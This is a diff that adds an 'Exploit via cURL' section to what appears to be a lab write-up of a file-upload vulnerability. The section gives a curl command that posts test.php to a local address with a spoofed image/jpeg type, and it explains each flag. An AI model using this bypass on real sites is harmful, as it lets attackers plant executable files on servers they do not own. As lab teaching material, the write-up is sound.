@@ -50,6 +50,25 @@ Content-Disposition: form-data; name="Upload"
 Upload
 ------WebKitFormBoundaryNHtXWgyPKt1jS4A8--
 ```
+#### Exploit via cURL
+
+To exploit this vulnerability directly via cURL:
+
+```bash
+curl -X POST "http://192.168.1.33/?page=upload" \
+-H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNHtXWgyPKt1jS4A8" \
+-F "MAX_FILE_SIZE=100000" \
+-F "uploaded=@test.php;type=image/jpeg" \
+-F "Upload=Upload"
+```
+
+### Key Points in cURL Command:
+
+- **`-X POST`**: Specifies the HTTP POST method.
+- **`-H "Content-Type"`**: Sets the boundary for the multipart form data.
+- **`-F`**: Sends form fields; `uploaded=@test.php` attaches the malicious file, faked as an image by specifying `type=image/jpeg`.
+
+
 
 ### Explanation
 
